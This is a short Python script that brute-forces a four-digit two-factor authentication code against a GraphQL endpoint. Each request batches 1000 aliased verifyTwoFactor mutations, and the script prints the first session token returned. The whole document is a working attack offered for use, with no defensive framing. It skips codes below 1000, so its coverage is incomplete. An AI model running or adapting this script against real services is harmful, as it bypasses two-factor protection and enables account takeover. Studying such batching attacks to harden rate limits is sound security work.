import sys
import requests


if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <url> <token>")
    sys.exit()

url = sys.argv[1]
TOKEN = sys.argv[2]

def send_batch(start, end):

    query = "mutation {"

    for i in range(start, end):
        query += f'v{i}: verifyTwoFactor(token: "{TOKEN}", otp:"{i:04}") {{token}}\n '    

    query +="\n}"
    
    data = {"query" : query}
    return requests.post(url, headers={"Content-Type": "application/json"}, json=data)


# We want to split the queries into batches
# Each batch - 1000 query?

batch = 1000
for i in range(1000,9999,batch):

    print(f'Testing {i} - {i + batch }')
    response = send_batch(i, i+ batch)

    # reponse contains key:value pair for the data object 
    #{ 
    #  "data" : 
    #    "verifyTwoFactor": {
    #   
    #   {
    #       "token" : "<token>" 
    #   }   
    #  }
    #}
    #
    #
    result = {k:v for k,v in response.json().get('data').items() if v}

    if result:
        print(result)
        break
